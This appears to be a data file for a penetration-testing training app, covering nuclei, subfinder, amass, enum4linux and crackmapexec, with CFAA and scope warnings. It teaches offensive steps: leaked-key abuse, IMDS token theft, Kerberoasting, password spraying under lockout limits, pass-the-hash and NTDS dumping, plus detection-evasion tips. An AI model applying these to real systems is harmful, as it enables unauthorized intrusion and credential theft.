sample_outputs.scenario: Advanced — large external attack surface, bug bounty program, scanning a list of 200 subdomains for cloud misconfigs, exposed secrets, and 2024-2025 CVEs with JSON output for pipeline ingestion
sample_outputs.command: nuclei -l subdomains_resolved.txt -tags aws,azure,gcp,exposure,misconfig,token -s critical,high,medium -c 10 -rl 15 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -json -o nuclei_results.json -stats
sample_outputs.explanation: Four findings, each a different kill chain branch. (1) aws-bucket-takeover on assets.corp-target.com: the subdomain's DNS CNAME points to an unclaimed S3 bucket — verify with 'aws s3 ls s3://assets.corp-target.com' and attempt bucket creation to confirm takeover. (2) exposed-env-file is the crown jewel: a .env file leaked DB credentials AND an AWS Access Key ID. Immediately run 'aws sts get-caller-identity --access-key-id AKIA...' to determine the IAM identity, then 'aws iam list-attached-user-policies' to enumerate permissions — this is a full cloud compromise path. (3) azure-managed-identity-exposed means the IMDS endpoint (169.254.169.254 or the Azure equivalent) is reachable through an SSRF-vulnerable proxy — use curl with the managed identity token endpoint to retrieve an OAuth token for Azure Resource Manager. (4) Grafana with admin:admin gives dashboard access and often leads to data source credential extraction (Prometheus, InfluxDB, cloud credentials stored in datasource configs). NEXT TOOLS: 'aws-cli' for IAM enumeration, 'trufflehog' to deep-scan the .env for additional secrets, 'roadtools' or 'stormspotter' for Azure identity graph mapping, 'metabigor' or manual curl for IMDS token extraction.

legal_notes: US CFAA (18 U.S.C. § 1030) — Nuclei's template engine sends active HTTP requests that constitute 'access' under the CFAA. Running nuclei against any host without explicit written authorization — including hosts that appear to be yours but are hosted on shared infrastructure — is a federal offense. 'I was just scanning' is not a defense; the CFAA does not require intent to cause damage, only unauthorized access. Bug bounty program scope documents are legal authorization instruments — read them carefully and stay within listed domains.

RULES OF ENGAGEMENT SCOPE — Nuclei's tag and template system makes it easy to accidentally scan out-of-scope assets. When given a subdomain list, verify every resolved IP falls within the authorized CIDR ranges before scanning. CDN-fronted targets (Cloudflare, Akamai, Fastly) may resolve to shared IPs serving thousands of customers — a nuclei scan against a CDN IP is a scan against every customer behind it, which is almost certainly out of scope and potentially illegal.

CLOUD ENVIRONMENT CONSIDERATION — Templates tagged 'aws', 'azure', and 'gcp' probe IMDS endpoints, metadata services, and cloud-specific APIs. In a penetration test of a cloud-hosted application, your rules of engagement must explicitly authorize cloud metadata probing. AWS, Azure, and GCP all log IMDS access in CloudTrail, Azure Monitor, and Cloud Audit Logs respectively — these logs are often reviewed by the client's cloud security team independently of the engagement, and unexpected IMDS probes may trigger an incident response before you can deconflict.
false_positives: VERSION-RANGE TEMPLATE MISMATCH — Many CVE templates match on version strings extracted from HTTP headers or response bodies using regex. A server running Apache 2.4.52 (patched) may still match a template written for Apache 2.4.49-2.4.51 if the regex is written as '2\.4\.[0-9]+' without an upper bound. Always manually verify the exact version and check the NVD entry for the precise affected range before reporting.

WAF/REVERSE-PROXY MASKING — A WAF sitting in front of the real application may return 200 OK with a custom error page body for every request, including probes for /.git/config or /wp-config.php.bak. Nuclei's HTTP matchers check status codes and response body patterns — if the WAF returns 200 with 'Access Denied' in the body and the template only checks for status 200, it will fire as a true positive when the file doesn't actually exist on the origin server. Always manually fetch the matched URL and inspect the full response.

CLOUD METADATA SSRF FALSE POSITIVES — The 'azure-managed-identity-exposed' and similar IMDS templates fire when the HTTP response contains metadata-shaped JSON. Load balancers and API gateways that return JSON health-check responses containing keys like 'instance', 'compute', or 'network' can trigger these templates even when no actual IMDS exposure exists. Confirm by checking whether the response contains a valid OAuth token endpoint or actual cloud provider metadata fields.

REDIRECT CHAINS AND LOGIN WALLS — Templates checking for exposed admin panels (Grafana, Kibana, Jenkins) match on the login page being reachable, not on authentication being bypassed. A finding of 'grafana-default-credentials' means nuclei successfully POSTed admin:admin and received a non-401 response — but some Grafana configurations return 302 to a dashboard on any POST regardless of credentials. Manually log in to confirm access.

RATE-LIMITED PARTIAL SCANS — If nuclei hits a rate limit mid-scan and requests start returning 429 or connection timeouts, templates that rely on response-body matching will produce false negatives (missed vulnerabilities) rather than false positives — but operators sometimes misread the stats output and assume a clean scan means no vulnerabilities. Always check the '-stats' output for error rates; a high timeout percentage means the scan was incomplete, not clean.
nuclei.teach_alt: Fast template-based vulnerability scanner with 6,000+ templates

subfinder.description: Passive subdomain discovery tool. Queries 40+ public data sources (Certificate Transparency, DNS databases, APIs, Shodan, VirusTotal) without sending any packets to the target. Completely passive OSINT recon.
subfinder.teach_intro: Subfinder finds subdomains without touching the target — it asks public databases. dev.target.com, staging.target.com, api.target.com, vpn.target.com — all potentially exposed and forgotten. Attack surface is almost always larger than the main domain suggests.

-d.label: Target Domain
-d.desc: Root domain to enumerate subdomains for.
-d.teach: Give subfinder the apex domain. It queries CT logs, VirusTotal, Shodan, and 40+ other sources. dev, staging, api subdomains frequently have weaker security.

-silent.label: Silent Mode
-silent.desc: Only output found subdomains. Perfect for piping into other tools.
-silent.teach: Silent mode is pipeline-ready. Output goes straight to httpx (check which are live) → then nuclei (scan each one).

-o.label: Output File
-o.teach: Save the list. Feed it to gobuster (dns mode), ffuf (vhost mode), httpx (aliveness check), then nuclei (scan all live ones).

-all.label: All Sources
-all.desc: Use all available data sources (requires API keys for some).
-all.teach: Without -all, subfinder uses free sources only. With API keys for Shodan, VirusTotal, Censys configured in ~/.config/subfinder/config.yaml, -all dramatically increases results.

-recursive.label: Recursive Discovery
-recursive.desc: Recursively find subdomains of discovered subdomains.
-recursive.teach: target.com → dev.target.com → db.dev.target.com. Deep recursion reveals internal-facing services accidentally exposed.

-t.label: Threads
-t.teach: More threads = faster enumeration across sources. Not limited by network since it's querying APIs, not the target.

opsec_notes: Subfinder makes NO direct contact with the target — all queries go to third-party APIs (Shodan, VirusTotal, CertSpotter, crt.sh, etc.). The target's DNS servers, web servers, and firewalls see zero traffic. This is the tool's core OPSEC advantage: you can run it from your home IP without any footprint on the target's infrastructure.

Your API keys ARE logged by the data providers you query. Shodan, VirusTotal, SecurityTrails, and similar services record every API call with your key, timestamp, and queried domain. If you're on a sensitive engagement, use burner API accounts registered to non-attributable email addresses, or omit keys entirely and accept reduced coverage.

Certificate Transparency logs (crt.sh, Censys) are the richest source subfinder queries — and they're PUBLIC. Any defender running a CT monitoring service (e.g., Facebook's cert-transparency-monitoring, or a custom crt.sh poller) will see the same subdomains you find, and may alert on new certificate issuances for their domain. Your recon reveals what the defender already knows they've exposed.

When subfinder is invoked via a wrapper script or automation framework (e.g., a Python subprocess call inside a recon pipeline), CrowdStrike Falcon and SentinelOne both score the parent-child process tree. A Python or Go binary spawning subfinder with high-entropy arguments and rapid outbound DNS resolution bursts can trigger behavioral ML detections on a managed endpoint — even though subfinder itself is passive. Run recon tooling from a dedicated, unmanaged recon box, not from a client-provided laptop.

Defender for Endpoint (MDE) with advanced hunting enabled logs DNS query telemetry via ETW. If you run subfinder on a Windows host (native binary or WSL), the outbound DNS resolutions to crt.sh, api.shodan.io, and similar endpoints appear in DeviceNetworkEvents and can be correlated by a SOC analyst reviewing the timeline. Artifact: look for DeviceNetworkEvents where RemoteUrl contains 'crt.sh' or 'virustotal.com' initiated by an unexpected process.

Recursive discovery (-recursive flag) multiplies your API call volume significantly. On large targets with many subdomains, this can exhaust rate limits on free-tier API keys mid-run, causing silent gaps in coverage. Worse, some providers throttle or flag accounts that hit rate limits repeatedly — burning your key. Pre-calculate expected subdomain depth and use -t to throttle threads before enabling recursion on large scopes.

'prometheus.megacorp.io' and 'grafana.megacorp.io' are monitoring stacks that often expose internal metrics unauthenticated. legal_notes: Under the CFAA (18 U.S.C. § 1030), subfinder's passive nature does NOT exempt you from legal exposure. Querying public databases about a domain you are not authorized to assess can still constitute 'unauthorized access' in the context of a broader unauthorized engagement. The tool being passive does not make the reconnaissance legal — authorization from the domain owner is required before any recon, passive or active.

Rules of engagement must explicitly cover subdomain scope. A client authorizing testing of 'targetcorp.com' may not have authorized testing of 'legacy.targetcorp.com' if it resolves to a third-party SaaS provider or a shared hosting environment. Confirm with the client whether discovered subdomains that resolve outside their IP ranges are in scope before proceeding to active testing.

Cloud-hosted subdomains (e.g., subdomains resolving to AWS CloudFront, Azure Front Door, or GCP Load Balancers) may be owned by a third-party CDN or cloud provider. Actively probing these endpoints without explicit authorization from BOTH the client AND the cloud provider can violate the cloud provider's terms of service and potentially the CFAA. Subdomain takeover testing in particular requires explicit written authorization — claiming an abandoned S3 bucket or Azure blob endpoint without permission is unauthorized access regardless of the misconfiguration.
false_positives: Wildcard DNS configurations cause subfinder to return hundreds of non-existent subdomains as valid. If a domain has a wildcard A record (*.targetcorp.com -> 1.2.3.4), every subdomain in any CT log or wordlist will appear 'valid'. Verify with: 'dig randomstring12345.targetcorp.com' — if it resolves, the domain uses wildcards and all results need DNS-level validation before being treated as real hosts.

Subdomain takeover candidates appear as valid subdomains but resolve to dangling CNAME records pointing at deprovisioned cloud resources (e.g., a CNAME to a deleted S3 bucket or an unclaimed Heroku app). Subfinder will list these as discovered subdomains, but they are not live services of the target — they are misconfiguration artifacts. Always resolve and HTTP-probe before reporting as attack surface.

Historical CT log entries surface subdomains that no longer exist in DNS. Certificate Transparency logs are append-only and never pruned — a subdomain that was live in 2019 and decommissioned in 2021 will still appear in crt.sh results in 2025. Subfinder does not validate DNS resolution by default; pipe output through a DNS resolver (e.g., 'dnsx -l subs.txt -a') to filter dead entries.

Multi-tenant SaaS subdomains appear in results but belong to other customers. For example, 'targetcorp.salesforce.com' or 'targetcorp.sharepoint.com' will surface in CT logs — these are Microsoft or Salesforce infrastructure, not the client's. Treating these as in-scope attack surface is both technically wrong and legally dangerous.

API key absence silently degrades coverage. Without configured keys for Shodan, VirusTotal, SecurityTrails, and similar paid sources, subfinder falls back to unauthenticated endpoints with strict rate limits. The tool will still return results but may miss 30-60% of subdomains that paid-tier sources would surface. A 'clean' result with no API keys configured is not a clean attack surface — it's an incomplete picture.

amass.description: In-depth attack surface mapping and asset discovery by OWASP. Combines passive OSINT with active DNS enumeration, certificate transparency, ASN discovery, and network graph building. The most comprehensive subdomain/infrastructure recon tool available.
amass.teach_intro: AMASS doesn't just find subdomains — it maps the entire attack surface. It discovers ASNs, CIDRs, IP ranges, related domains, and builds a relationship graph of everything connected to the target. Use it when you need the deepest possible picture before an engagement.

enum.label: Enumerate Mode
enum.teach: enum mode does full enumeration. Add -passive for OSINT-only. Default includes active DNS queries.

intel.label: Intel Mode
intel.desc: Discover root domains, ASNs, and CIDRs owned by an organization.
intel.teach: Intel mode finds everything a company owns by searching WHOIS, ASN records, and netblocks. Gives you domains you didn't know to look for.

-d.label: Target Domain
-d.teach: Primary target domain. Amass will find subdomains, related domains, and connected infrastructure.

-passive.label: Passive Only
-passive.desc: Only use passive OSINT sources. Never touches the target directly.
-passive.teach: Passive mode is OPSEC-safe. Queries CT logs, Shodan, VirusTotal, ThreatCrowd. Zero packets to target.

-active.label: Active Enumeration
-active.desc: Include active DNS resolution, zone transfers, and brute forcing.
-active.teach: Active mode sends DNS queries and attempts zone transfers. Much more thorough but leaves traces in DNS server logs.

-brute.label: DNS Brute Force
-brute.desc: Brute force subdomains with a wordlist.
-brute.teach: Brute force finds subdomains not indexed in any public database. Pair with a good wordlist from seclists.

-o.label: Output File
-o.teach: Always save amass output — it includes IP addresses, ASNs, and relationships, not just hostnames.

-json.label: JSON Output
-json.desc: Save results in JSON format with relationship data.
-json.teach: JSON output preserves the graph relationships. Import into maltego or process with jq to extract specific data types.

opsec_notes: BEGINNER NOISE: Every amass enum run generates hundreds to thousands of DNS queries from your host. Any passive DNS monitoring service (Farsight DNSDB, Cisco Umbrella, internal DNS logging) will record your resolver IP querying every subdomain permutation of the target. Your ISP or corporate DNS server sees all of it. Run from a dedicated VPS or cloud exit node, never from your home IP or corporate network.

CONCRETE ARTIFACT — DNS query logs: Passive DNS aggregators like Farsight DNSDB and SecurityTrails log queries in near-real-time. If the target runs their own authoritative DNS with query logging enabled, active brute-force mode (-brute) will write thousands of NXDOMAIN responses to their DNS server logs with your source IP. Defenders watching for reconnaissance will see a burst of NXDOMAIN responses from a single IP within seconds — a near-perfect recon signature.

CUTTING-EDGE 2025: Certificate Transparency log polling (amass's default behavior via crt.sh, Censys, and Google CT) leaves no direct fingerprint on the target — it's entirely passive against third-party infrastructure. However, if the target monitors their own CT log submissions via tools like certspotter or Facebook's CT monitor, they will see new certificates you discover simultaneously. This is not a detection of YOUR query, but it means the target's blue team has the same visibility you do on cert issuance.

CUTTING-EDGE 2025-2026: Amass's active enumeration mode (-active) performs zone transfer attempts and direct DNS resolution that will appear in the target's authoritative DNS server logs and any network-layer NDR (Network Detection and Response) platform like Darktrace, ExtraHop, or Vectra AI. These platforms build behavioral baselines — a sudden spike in DNS query volume from a new external IP to a target's authoritative nameservers is a high-fidelity anomaly alert. Vectra AI's 'Command and Control' and 'Reconnaissance' detection models in 2025 specifically flag high-entropy subdomain enumeration patterns.

ARTIFACT — ASN/BGP queries: Amass intel mode queries ARIN, RIPE, APNIC, and BGP routing tables (via Team Cymru, BGPView, and similar). These queries are logged by the RIR APIs. Some enterprise targets monitor ARIN WHOIS query logs for their own ASN lookups as a threat-intel tripwire. Use -passive and route through a residential proxy or Tor exit if attribution is a concern during pre-engagement OSINT.

ADVANCED OPSEC: Amass writes a local graph database (default: ~/.config/amass/graph.db using Cayley/Bolt). On a shared pentest box or a compromised pivot host, this file contains the full enumerated attack surface of every target you've ever run amass against. Secure or wipe this file post-engagement. On Windows-based pivot hosts, equivalent local artifact storage from ported tools will appear under %APPDATA% and will be captured by EDR filesystem telemetry (CrowdStrike Falcon's file-write events, Sysmon EID 11).

The brute-force results reveal high-value internal-facing services exposed externally: 'k8s-dashboard' (Kubernetes Dashboard — frequently unauthenticated or weakly authenticated in 2023-2025 deployments), 'vault' (HashiCorp Vault — check for UI exposure and unauthenticated sys/health endpoint), 'jenkins' (CI/CD — check for script console access), and 'grafana' (check for CVE-2021-43798 path traversal on older versions or default admin:admin credentials). The ASN and CIDR discovery (AS64512, 203.0.113.0/24, 198.51.100.0/26) is critical — these are IP ranges the client owns that may not have been listed in the initial scope document. Bring these to the client for scope confirmation before touching them. Next steps: (1) feed the JSON output into BloodHound's new external attack surface features or a custom Neo4j graph for relationship mapping, (2) run 'httpx' across all discovered hosts with '-title -status-code -tech-detect -follow-redirects', (3) specifically probe 'k8s-dashboard.megacorp.com' with 'curl -sk https://k8s-dashboard.megacorp.com/api/v1/namespace/default/pods' to test for unauthenticated API access, (4) run 'nuclei -t network/kubernetes/' against the K8s endpoint.

legal_notes: US CFAA BOUNDARY: Amass's passive mode queries only third-party OSINT sources (CT logs, Shodan, SecurityTrails, VirusTotal) and does not touch the target's infrastructure — this is generally considered legally safe for pre-authorization research, similar to a Google search. However, active mode (-active) and brute-force mode (-brute) send DNS queries directly to the target's authoritative nameservers and may constitute 'unauthorized access to a computer' under 18 U.S.C. § 1030 if performed without written authorization. Zone transfer attempts (-active includes these) are particularly aggressive and have been cited in CFAA cases as evidence of unauthorized access attempts. Get written authorization before running anything beyond -passive.

SCOPE AUTHORIZATION: The ASN and CIDR discovery capability of amass intel mode is a double-edged sword. Amass will discover IP ranges and related domains that the client may not have included in the initial scope document — subsidiaries, acquired companies, cloud-hosted infrastructure, and CDN origin IPs. Scanning or exploiting any of these without explicit written confirmation that they fall within scope is a rules-of-engagement violation, even if the client 'owns' them. Always present discovered out-of-scope assets to the client and get written approval before proceeding. Document this exchange.

CLOUD AND MODERN INFRASTRUCTURE: Amass frequently discovers cloud-hosted subdomains (e.g., targets resolving to AWS CloudFront, Azure Front Door, GCP Load Balancers, or Fastly CDN). Scanning or probing these endpoints may trigger abuse reports to the cloud provider (AWS, Azure, GCP all have abuse reporting pipelines) and can result in your VPS or cloud account being suspended. Additionally, some cloud providers (AWS in particular) require separate authorization for penetration testing against their infrastructure even when the customer has authorized you — review AWS's Penetration Testing Policy and Azure's equivalent before probing cloud-hosted assets discovered by amass.
false_positives: WILDCARD DNS: Many domains configure wildcard DNS records (*.targetcorp.com -> 1.2.3.4) so that any subdomain resolves to a valid IP. Amass's brute-force mode will return thousands of 'discovered' subdomains that are all the same wildcard response. Amass has wildcard detection built in, but it can be fooled by dynamic wildcard responses that return different IPs or slightly different TTLs per query. Always validate discovered subdomains with 'httpx' or 'dnsx -resp' to confirm they serve real content before treating them as live targets.

CDN AND SHARED HOSTING IP INFLATION: When amass resolves subdomains to IPs and discovers CIDRs, it will frequently attribute large CDN IP ranges (Cloudflare's 104.16.0.0/12, Fastly's 151.101.0.0/16, Akamai ranges) as belonging to the target. These are shared infrastructure IPs — the target does not own them. Treating these CIDRs as in-scope for scanning will result in scanning thousands of unrelated organizations' infrastructure, which is both illegal and useless.

CERTIFICATE TRANSPARENCY GHOST SUBDOMAINS: CT logs are permanent and append-only. Amass will discover subdomains from certificates that were issued years ago for infrastructure that no longer exists — decommissioned servers, old staging environments, acquired-then-shut-down subsidiaries. A subdomain appearing in CT logs does not mean it currently resolves or hosts anything. Always resolve and HTTP-probe every discovered subdomain before investing time in it.

ASN MISATTRIBUTION: Amass's ASN discovery relies on BGP routing table data and WHOIS records, which are frequently stale or inaccurate. IP space that was previously owned by the target and appears in ARIN records may have been sold, transferred, or re-allocated to a completely different organization. Verify current ownership of any discovered CIDR via a live WHOIS query and reverse DNS before including it in scope discussions with the client.

THIRD-PARTY SaaS SUBDOMAINS: Modern enterprises use dozens of SaaS platforms that create subdomains on their behalf — 'targetcorp.zendesk.com', 'targetcorp.okta.com', 'targetcorp.my.salesforce.com'. Amass will discover these and they will appear as legitimate subdomains of the target. These are third-party infrastructure — you do not have authorization to pentest Zendesk, Okta, or Salesforce's platforms just because the client authorized you to test their environment. Subdomain takeover checks (dangling CNAMEs) are generally acceptable, but active exploitation of the SaaS platform itself requires separate authorization from the SaaS vendor.

enum4linux.description: SMB/NetBIOS enumeration tool for Windows and Samba systems. Extracts: usernames, groups, shares, policies, OS info, and domain data using null sessions and anonymous authentication. Essential for Active Directory recon.
enum4linux.teach_intro: Enum4linux queries Windows SMB (port 445) and NetBIOS (port 139) for information available without valid credentials. Null sessions and anonymous authentication often expose usernames, share lists, and domain information — all useful for building your attack plan against Windows environments.

-a.label: All Simple Checks
-a.desc: Run all simple enumeration checks. The go-to flag for initial SMB recon.
-a.teach:
-a runs everything: shares, users, groups, OS info, password policy. One flag gets you everything available without creds.

All enumeration (combines -U -S -G -P -r -o -n -i)

-U.label: Get Users
-U.teach:
RID cycling starts from RID 500 (Administrator) and increments, resolving each RID to a username. Lists all local and domain accounts.

Enumerate users via RPC

-S.label: Get Shares
-S.teach:
Lists all SMB shares. SYSVOL and NETLOGON are standard AD shares. C$, ADMIN$ require admin rights. Look for unusual shares with sensitive data.

Enumerate shares

-P.label: Get Password Policy
-P.teach:
Password policy reveals: min length, lockout threshold, lockout duration. Guides your brute force strategy — stay under the lockout count!

Get password policy (min length, lockout threshold)

-G.label: Get Groups
-G.teach:
Group membership reveals privilege structure. Who's in Domain Admins? Who's in Remote Desktop Users? Maps your escalation path.

Enumerate groups

-u.label: Username
-u.teach:
Authenticated enum returns much more data. If you have any valid credentials (even low-priv), always use them.

Authentication: -u admin -p password

-p.label: Password
-p.teach: Combined with -u. Even guest/guest or domain\user:password works for expanded enumeration.

-r.label: -r
-r.teach: RID cycling (brute force user IDs to discover accounts)

output_read.meaning: discovered user account — add to your list
accessible share — mount it: smbclient //target/share
can enumerate without credentials (misconfiguration)
how strong to make brute force attempts
structure — interesting for AD attacks

opsec_notes: Beginner noise: enum4linux generates a burst of SMB/NetBIOS traffic — multiple rapid connections to ports 139 and 445 from a single source IP within seconds. Any network IDS with default SMB enumeration signatures (Snort SID 2000537, Suricata SMB null-session rules) will alert immediately. This is not a quiet tool.

Every null-session bind (IPC$ anonymous connect) is logged on the Windows target as Event ID 4624 (Logon Type 3, anonymous) and EID 4776 (NTLM credential validation attempt). On a hardened 2022/2025 domain, these events feed directly into Microsoft Sentinel or Splunk ES correlation rules looking for anonymous SMB enumeration patterns.

CrowdStrike Falcon's network telemetry (Falcon Insight XDR, 2024-2025 sensor builds) correlates the process tree of the tool invoking SMB sessions with the volume and timing of IPC$ connections. A Python or Perl process (enum4linux is a Perl wrapper around smbclient/rpcclient) opening 8-12 sequential SMB sessions to the same host in under 30 seconds is a high-confidence behavioral IOC — Falcon scores this as 'SMB Reconnaissance' and can auto-contain the source endpoint.

SentinelOne's Deep Visibility telemetry captures the exact command line of rpcclient and smbclient child processes spawned by enum4linux, including all arguments. The parent-child relationship (enum4linux.pl -> rpcclient -> smbclient) is a known process tree signature. Defenders with custom STAR rules or Deep Visibility queries hunting for rpcclient with '-U%' (null-session flag) will catch this in near-real-time.

Concrete defender artifact: on the target Windows host, Security log EID 4624 with Logon Type 3 and Account Name 'ANONYMOUS LOGON' paired with EID 5140 (network share object accessed, share name IPC$) is the canonical null-session fingerprint. SIEM correlation of 5+ EID 5140 events for IPC$ from the same source IP within 60 seconds is a reliable detection rule. Log path: C:\Windows\System32\winevt\Logs\Security.evtx.

Advanced evasion consideration (2025): Modern hardened AD environments (CIS Benchmark Level 2 for Windows Server 2022, STIG V-254239) disable null sessions entirely via RestrictAnonymous=2 and RestrictAnonymousSAM=1 registry keys. In these environments enum4linux returns almost nothing useful. Operators should validate null-session availability with 'smbclient -L //target -N' before running a full enum4linux sweep — burning the source IP on a hardened target with zero yield is pure cost.

sample_outputs.scenario: Advanced: Internal pentest, hardened Windows Server 2022 DC at 172.16.5.10, using authenticated enumeration with a low-priv domain account obtained via phishing to extract full user/group/policy data for AD attack planning
sample_outputs.explanation: This output is a goldmine for AD attack planning. The SID (S-1-5-21-...) is the domain SID — you'll need this for forging Kerberos tickets later. The service accounts (svc_backup, svc_sql) are high-value Kerberoasting targets: service accounts often have SPNs registered and weak passwords. The password policy tells you the lockout threshold is 5 attempts per 30-minute window — you can safely spray 4 attempts per account per window without triggering lockout. Next steps: (a) Run BloodHound ('bloodhound-python -u jsmith -p Welcome2024! -d corp.local -dc 172.16.5.10 -c All') to map ACL paths from jsmith to Domain Admins. (b) Kerberoast the service accounts with Impacket ('GetUserSPNs.py CORP/jsmith:Welcome2024!@172.16.5.10 -request') and crack hashes offline with hashcat mode 13100. (c) Check if helpdesk_admin has GenericAll or WriteDACL on any privileged group via BloodHound — helpdesk accounts are frequently over-permissioned in real environments.

legal_notes: US CFAA (18 U.S.C. § 1030): Connecting to a remote host's SMB/NetBIOS ports and extracting user, share, and policy data — even via null/anonymous sessions — constitutes 'accessing a computer without authorization' if you do not have explicit written permission from the system owner. The fact that the server responds to anonymous queries does not imply authorization. CFAA penalties for unauthorized access to protected computers start at 5 years federal imprisonment for first offenses.

Rules of engagement scope: Confirm that 172.16.x.x or whatever subnet you're targeting is explicitly listed in your signed scope document. Enum4linux's RID cycling will query the DC for every account in the domain — if the DC is shared infrastructure (e.g., a managed service provider's domain serving multiple clients), you may be enumerating accounts belonging to out-of-scope organizations. Get per-IP or per-subnet authorization in writing before running.

Modern AD / cloud boundary: In hybrid Azure AD / Entra ID environments, the on-prem domain accounts enumerated by enum4linux may be synchronized to Azure AD (Entra ID). Enumerating and then attacking these accounts could extend your legal exposure to cloud-hosted resources and Microsoft's terms of service, even if your scope document only covers the on-prem network. Clarify hybrid identity scope with your client before proceeding.
false_positives: RestrictAnonymous=1 (partial restriction) causes enum4linux to return an empty user list but still enumerate shares — operators frequently misread this as 'no users exist' when in reality the SAM enumeration is blocked but the host is fully populated. Always cross-validate with an authenticated run (-u/-p) before concluding the environment has no accounts.

RID cycling gaps: enum4linux's default RID range (500-550, 1000-1050) misses accounts with RIDs above 1050 — common in large enterprises where hundreds of service accounts and users have been created over years. An operator who sees only 8 accounts and concludes 'small environment' may be missing 200+ accounts with RIDs in the 1100-2000 range. Use '-r' with an extended range or supplement with rpcclient's 'enumdomusers' for a complete picture.

Samba version misreporting: enum4linux pulls OS and version strings from SMB negotiation responses. Samba servers frequently report themselves as 'Windows Server 2003' or 'Windows 6.1' in their SMB dialect negotiation for compatibility reasons, even when running Samba 4.x on Linux. Treating the reported OS string as ground truth will send you down the wrong attack path — verify with nmap's smb-os-discovery script independently.

Share listing vs. share access: enum4linux reports a share as 'Mapping: OK' if it can connect to the IPC path, but 'Listing: DENIED' means you cannot enumerate contents. Operators sometimes record 'share found' in their notes without distinguishing between a share that is accessible and one that merely responds to connection attempts. A share that maps but doesn't list may still be writable — test with smbclient explicitly rather than relying on enum4linux's listing result alone.

Null session availability is environment-specific per-host: In a domain with mixed OS versions, a Windows Server 2016 member server may allow null sessions while the 2022 DC does not. Enum4linux run against the DC returning nothing does not mean null sessions are blocked domain-wide. Test each target host individually — do not generalize from one host's response to the entire subnet.

crackmapexec.description: Swiss Army knife for Windows/Active Directory post-exploitation and lateral movement. Tests credentials across entire subnets, dumps hashes, executes commands, deploys agents, and maps AD environments. Competes directly with Cobalt Strike for post-access operations.
crackmapexec.teach_intro: CME automates what would take hours manually in AD environments. Give it a subnet and credentials — it tests every host, shows which ones you can admin, and lets you dump SAM/NTDS hashes, execute commands, or spider shares across the entire domain in minutes.

smb.label: SMB Protocol
smb.desc: Target Windows SMB (the most common usage).
smb.teach:
SMB mode tests credentials and executes against Windows hosts. A green [+] means success. Red [-] means denied. Pwn3d! means you're a local admin.

SMB protocol (most common for AD)

winrm.label: WinRM Protocol
winrm.teach:
WinRM gives you PowerShell remoting. If SMB works and WinRM is open, you can drop into an interactive PS session.

Windows Remote Management

ldap.label: LDAP Protocol
ldap.teach: LDAP against the DC dumps users, groups, GPOs, and trusts. --bloodhound exports data for BloodHound graph analysis.

-u.label: Username
-u.teach:
Single username for targeted sprays. Use a file for mass testing: -u users.txt. Always respect lockout policies!

Username or file: -u users.txt

-p.label: Password
-p.teach:
Combined with -u. For spraying: single password against many users. For dumping: use cracked password to authenticate.

Password or file: -p passwords.txt

-H.label: NT Hash (Pass the Hash)
-H.desc: Use NT hash instead of password for authentication.
-H.teach:
Pass the Hash doesn't need the plaintext password — just the NTLM hash. Dump hashes from one machine, pass them to access others. Classic lateral movement.

NTLM hash (pass-the-hash): -H aad3b435b51404eeaad3b435b51404ee:hash

--sam.label: Dump SAM Hashes
--sam.desc: Dump local SAM database (requires local admin).
--sam.teach:
SAM contains local account hashes. Administrator hash often reused across machines. Crack with hashcat or pass-the-hash directly.

Dump SAM database (local accounts)

--ntds.label: Dump NTDS (DC Only)
--ntds.desc: Dump the entire Active Directory database from a Domain Controller.
--ntds.teach:
NTDS.dit is the crown jewel — every domain account hash in one dump. Domain compromise means cracking every user's password.

Dump Active Directory database

--shares.label: Enumerate Shares
--shares.desc: List all accessible shares on target(s).
--shares.teach:
Maps readable shares across the network. Find: finance folders, HR data, passwords.xlsx, backup files. Lateral movement goldmine.

Enumerate accessible SMB shares

-x.label: Execute Command
-x.desc: Execute a shell command on target(s).
-x.teach:
-x runs the command via SMBExec. -X runs PowerShell commands. Start with 'whoami /priv' to see your privileges.

Execute command: -x 'whoami'

--bloodhound.label: BloodHound Collection
--bloodhound.desc: Collect AD data for BloodHound graph analysis.
--bloodhound.example: crackmapexec ldap dc01.domain.com -u user -p password --bloodhound -ns 192.168.1.1 --collection All
--bloodhound.teach: BloodHound data reveals shortest path to Domain Admin. Visual attack path mapping — indispensable for complex AD environments.

opsec_notes: BEGINNER NOISE: Every CME credential test generates a full SMB handshake (TCP 445) to each target — a /24 sweep produces 254 authentication attempts in seconds. Any SIEM with a 'multiple failed logons from single source' rule (Windows EID 4625 / 4776) will alert within the first 10-15 hosts. Default CME is loud by design.

CONCRETE ARTIFACT: Successful CME SMB auth writes Windows Security EID 4624 (logon type 3 — network logon) on the target, and EID 4648 (explicit credential use) if --sam or -x is invoked. Domain controllers additionally log EID 4768/4769 (Kerberos TGT/TGS requests) and EID 4776 (NTLM validation). Defenders correlating source IP across these events across multiple hosts in a short window is the canonical detection path.

CUTTING-EDGE 2025: CrowdStrike Falcon's Identity Protection module (formerly Preempt) scores lateral movement attempts using behavioral baselines — if the account has never authenticated to a given host before, the first CME hit generates an 'unusual lateral movement' detection regardless of credential validity. Rotating source IPs does not defeat this because the detection is account-behavior-anchored, not source-IP-anchored.

CUTTING-EDGE 2025: Microsoft Defender for Endpoint (MDE) on Win11 22H2+ and Server 2022 correlates process tree telemetry with network authentication events via ETW-TI (Threat Intelligence provider). When CME's --sam flag triggers reg.exe or secretsdump-style DCOM calls, MDE's 'credential dumping from SAM' alert fires based on the API call sequence (SamConnect -> SamOpenDomain -> SamQueryInformationUser), not just the process name — renaming the binary does not evade this.

RATE LIMITING EVASION RISK: Using --jitter and --delay flags reduces temporal clustering but does NOT reduce the total authentication event count. Modern SIEMs (Splunk ES, Microsoft Sentinel) use statistical baselines over rolling 24h windows — a slow sweep that produces 254 auth events from one source over 6 hours still triggers 'authentication sweep' analytics rules in environments with tuned ML-based detections.

NTDS DUMP ARTIFACT: --ntds vss triggers Volume Shadow Copy creation (EID 8222 in the VSS event log, plus WMI activity in Microsoft-Windows-WMI-Activity/Operational). This is one of the highest-fidelity ransomware precursor indicators in modern threat intel — any mature SOC has an alert on VSS creation by non-backup accounts. Prefer --ntds drsuapi (DCSync via MS-DRSR) when you have domain replication rights; it leaves no VSS artifact but does generate EID 4662 with GUID {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} on the DC.

sample_outputs.scenario: Beginner: Single Windows host, testing a recovered plaintext credential to confirm local admin access before attempting lateral movement
sample_outputs.output:
SMB         192.168.1.50    445    DESKTOP-7HK2MN  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DESKTOP-7HK2MN) (domain:CORP) (signing:False) (SMBv1:False)
